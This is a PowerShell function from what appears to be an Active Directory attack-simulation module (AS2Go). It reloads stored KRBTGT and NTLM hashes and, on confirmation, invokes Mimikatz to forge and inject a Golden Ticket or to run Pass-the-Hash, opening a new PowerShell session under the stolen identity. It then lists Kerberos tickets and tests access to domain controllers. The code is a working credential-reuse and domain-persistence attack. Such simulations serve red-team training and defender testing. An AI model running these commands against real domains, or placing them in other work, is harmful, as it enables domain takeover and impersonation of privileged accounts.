<#
.SYNOPSIS
Loads stored KRBTGT or NTLM hash data and reruns the matching ticket command.

.DESCRIPTION
Reads the saved ASP07KR and ASP07NT hash data from the AS2Go configuration and displays the stored values.
Offers to rerun the Golden Ticket command with the stored KRBTGT hash or the Pass-the-Hash command with the
stored NTLM hash, and reports the outcome of the selected injection.
Offers to repeat the selection after a command is started. Skip returns from the workflow.

.EXAMPLE
Invoke-LoadHash
Runs this workflow using the initialized AS2Go module configuration.

.INPUTS
None. This function does not declare pipeline input.

.OUTPUTS
Console messages and output from invoked commands; no dedicated result object is defined.

.NOTES
Private AS2Go function. Run from an initialized AS2Go module session.
Requires Mimikatz and previously stored ASP07KR or ASP07NT hash data in the AS2Go configuration.

.COMPONENT
Category: Main Function

.FUNCTIONALITY
Loads the stored KRBTGT or NTLM hash data and reruns the matching Golden Ticket or Pass-the-Hash command.
Shows the injection outcome so users can see how previously saved credential material is reused.
Request a Kerberos TGT using an NT hash (Overpass-the-Hash)
#>
function Invoke-LoadHash {

    ################################################################################
    #####                                                                      ##### 
    #####         Load and reuse stored hash data                              #####                                 
    #####                                                                     #####
    ################################################################################

    $Info = Measure-FunctionRuntime -Begin

    Show-CurrentPhase -Phase "ASP07_LoadHash.html"
    Update-WindowTitle -NewTitle "Load Hash Attack"
    Set-ASConfig -Setting "LastStage" -Value "Load Hash Attack"

    $gtData = Get-ASConfig -Setting "ASP07KR" -DPAPI
    $ntData = Get-ASConfig -Setting "ASP07NT"

    $gtParts = If ($gtData) { $gtData.split("|") } else { @() }
    $ntParts = If ($ntData) { $ntData.split("|") } else { @() }

    # GoldenTicket checks first (FQDN) and last (domain SID) fields; the KR format still needs all five fields.
    $gtValid = ($gtParts.Count -eq 5) -and (Test-ADFormat -Type GoldenTicket -Value $gtData)
    $ntValid = Test-ADFormat -Type Hash -Value $ntData

    If (-not ($gtValid -or $ntValid)) {
        Write-AS2GoOutput -Type Warning -Message "No stored hash data found. Run the Golden Ticket attack or the Overpass-the-Hash attack first."
        Measure-FunctionRuntime -End -Details $Info
        return
    }

    $helpKRBTGT = ""
    If ($gtValid) {
        $helpKRBTGT = "Forge a Golden Ticket for '$($gtParts[1])' in '$($gtParts[0])' with the stored KRBTGT hash."
    }
    $helpNTLM = ""
    If ($ntValid) {
        $helpNTLM = "Reuse the stored NTLM hash for '$($ntParts[1])' in '$($ntParts[0])'."
    }

    Do {

        If (-not $SkipClearHost) { Clear-Host }

        Write-AS2GoOutput -Type Header -Message "Reuse a previously stored hash"
        Write-AS2GoOutput -Type H1 -Message $((Get-Help (Get-FunctionName)).Functionality)

        If ($gtValid) {
            Write-AS2GoOutput -Type TextMaker -Message "Stored KRBTGT hash data:" -TM "$gtData" -NoExtraLines
        }
        If ($ntValid) {
            Write-AS2GoOutput -Type TextMaker -Message "Stored NTLM   hash data:" -TM "$ntData" -NoExtraLines
        }
        write-host "`n"

        $title = "Load Hash"
        $message = "Select the stored hash data to load and use."

        If ($SafeMode) {

            $Options = @(
                [pscustomobject] @{
                    Label = "&Skip"
                    Help  = "Skip the Load Hash simulation."
                    Value = $Script:No
                }
            )
        }
        else {

            $Options = @(
                [pscustomobject] @{
                    Label = "&KRBTGT (Golden Ticket)"
                    Help  = $helpKRBTGT
                    Value = "KRBTGT"
                },
                [pscustomobject] @{
                    Label = "&NTLM (Pass-the-Hash)"
                    Help  = $helpNTLM
                    Value = "NTLM"
                },
                [pscustomobject] @{
                    Label = "&Skip"
                    Help  = "Skip the Load Hash simulation."
                    Value = $Script:No
                }
            )
        }

        $answer = Show-DecisionPrompt -Message $message -Options $Options -Default 0 -Title $title

        write-host "`n"

        If ($answer -eq "KRBTGT") {

            $Script:ASFQDN = $gtParts[0]
            $ShadowUser = $gtParts[1]
            $Script:ASKrbtgtNtml = $gtParts[2]
            $groups = $gtParts[3]
            $Script:ASDomainSID = $gtParts[4]

            Set-ASConfig -Setting "LastGTUser" -Value $ShadowUser

            Write-Host      -NoNewline "  Command: "
            Write-Highlight -Text ".\mimikatz.exe ", """privilege::debug"" ""kerberos::purge"" ""kerberos::", "golden", " /domain:", $Script:ASFQDN, " /sid:", $Script:ASDomainSID, " /rc4:", $Script:ASKrbtgtNtml, " /user:", $ShadowUser, " /id:", "6666666", " /groups:", $groups, " /ptt"" ""exit"""  `
                -Color $fgcC, $fgcS, $fgcV, $fgcS, $fgcV, $fgcS, $fgcV, $fgcS, $fgcV, $fgcS, $fgcV, $fgcS, $fgcV, $fgcS, $fgcV, $fgcS

            $answer = Show-DecisionPrompt

            If ($answer -eq $Script:Yes) {

                $TicketLog = "$Script:DefautExfiltrationFolder\$ShadowUser`Load.log"
                Remove-Item $TicketLog -ErrorAction SilentlyContinue

                Invoke-Command -ScriptBlock { & "$($Script:ASTools)\mimikatz.exe" "log $TicketLog" "privilege::debug" "kerberos::purge" "kerberos::golden /domain:$Script:ASFQDN /sid:$Script:ASDomainSID /rc4:$Script:ASKrbtgtNtml /user:$ShadowUser /id:6666666 /groups:$groups /ptt" "exit" }

                [string]$result = get-content -path $TicketLog | Select-String 'Golden ticket for'

                If ([string]::IsNullOrEmpty($result)) {
                    Write-AS2GoOutput -Type Error -Message "Failed to submit a Golden ticket for '$ShadowUser'."
                }
                else {
                    Write-AS2GoOutput -Type Success -Message $result
                }

                Pause

                Write-AS2GoOutput -Type Header -Message "Displays a list of currently cached Kerberos tickets"
                Write-AS2GoOutput -Type CodeSnippet -Message "Command:"

                Write-Highlight -Text ('      klist') -Color $fgcC
                Write-Host ""
                Set-NewColorSchema -NewStage $Script:GoldenTicket
                $tickets = Get-KlistTicket
                $tickets | Format-Table TicketNumber, Client, Server, EncryptionType, EndTime -AutoSize
                Write-AS2GoOutput -Type Info -Message "Last Ticket"
                $tickets | Select-Object -Last 1 | Format-List
                Set-NewColorSchema -NewStage $Script:InitialStart
                Test-AccessToOneDCPerDomain
            }
        
        }
        elseif ($answer -eq "NTLM") {

            $Script:ASFQDN = $ntParts[0]
            $Global:ASHelpDeskUser = $ntParts[1]
            $Script:ASPtHntml = $ntParts[2]

            Write-AS2GoOutput -Type NextCommand -Message "Command:" -NoExtraLines -NoNewLine
            Write-Highlight -Text ".\mimikatz.exe ", """privilege::", "debug", """ ""sekurlsa::", "pth", " /user:", $Global:ASHelpDeskUser, " /ntlm:", $Script:ASPtHntml, " /domain:", $Script:ASFQDN, """ ""exit"""   `
                -Color $fgcC, $fgcS, $fgcV, $fgcS, $fgcV, $fgcS, $fgcV, $fgcS, $fgcV, $fgcS, $fgcV, $fgcS

            $answer = Show-DecisionPrompt

            If ($answer -eq $Script:Yes) {

                Invoke-Command -ScriptBlock {
                    & "$($Script:ASTools)\mimikatz.exe" `
                        "privilege::debug" `
                        "sekurlsa::pth /user:$Global:ASHelpDeskUser /ntlm:$Script:ASPtHntml /domain:$Script:ASFQDN /run:pwsh.exe" `
                        "exit"
                }

                Write-AS2GoOutput -Type Header -Message "Use the New Command Window"
                Write-AS2GoOutput -Type Info -Message "The Pass-the-Hash command opened a new command window for the hash reuse."
                Write-AS2GoOutput -Type NextCommand -Message "Please continue inside the new terminal window" -NoExtraLines
            }
        }
        else {
            Measure-FunctionRuntime -End -Details $Info
            return
        }

        $title = "REPEAT | Load Hash"
        $repeat = Show-DecisionPrompt -Default 1 -Title $title

    } Until ($repeat -eq $Script:No)

    Measure-FunctionRuntime -End -Details $Info
}